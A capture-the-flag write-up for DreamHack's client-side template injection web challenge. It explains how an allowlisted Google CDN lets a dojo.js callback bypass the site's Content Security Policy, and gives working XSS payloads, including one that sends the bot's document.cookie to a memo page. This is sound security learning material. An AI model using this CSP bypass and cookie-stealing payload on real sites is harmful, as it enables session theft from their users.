# Client Side Template Injection — DreamHack

> **Room / Challenge:** Client Side Template Injection (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Client Side Template Injection (web)
- **Link**: `https://dreamhack.io/wargame/challenges/437`
- **Level:** `2`
- **Date:** `14-11-2025`

---

## Goal

Bypassing CSP rules and get the flag with XSS.

## My Solution

This challenge is similar to [CSP Bypass](https://dreamhack.io/wargame/challenges/435) and [DOM XSS](https://dreamhack.io/wargame/challenges/438), however the CSP policy is different:

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response
```

The app accepts script from `https://ajax.googleapis.com`, this is a huge security vulnerability we can check it in [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

![Guide image](./screenshots/1.png)

After spending time researching and testing, I found a library from `ajax.googleapis.com` that we can leverage which is `dojo.js`, this library accepts a `callback` param:

```
<script src="https://ajax.googleapis.com/ajax/libs/dojo/1.10.4/dojo/dojo.js" data-dojo-config="callback:alert(1)"></script>
```

Visit `/vuln?param=<script src="https://ajax.googleapis.com/ajax/libs/dojo/1.10.4/dojo/dojo.js" data-dojo-config="callback:alert(1)"></script>`:

![Guide image](./screenshots/3.png)

Now we can redirect the bot with this library, but there is a problem this code may execute before the cookie is loaded in the bot

```python
driver = webdriver.Chrome(service=service, options=options)
driver.implicitly_wait(3)
driver.set_page_load_timeout(3)
driver.get("http://127.0.0.1:8000/")
driver.add_cookie(cookie)
driver.get(url)
```

So we have to wait after window is fully loaded then redirect:

```
<script src="https://ajax.googleapis.com/ajax/libs/dojo/1.10.4/dojo/dojo.js"
        data-dojo-config="callback:window.addEventListener('load',function(){location.href='/memo?memo='+document.cookie})">
</script>
```

Submit this payload in `/flag` and visit `/memo` to get the flag:
![Guide image](./screenshots/2.png)
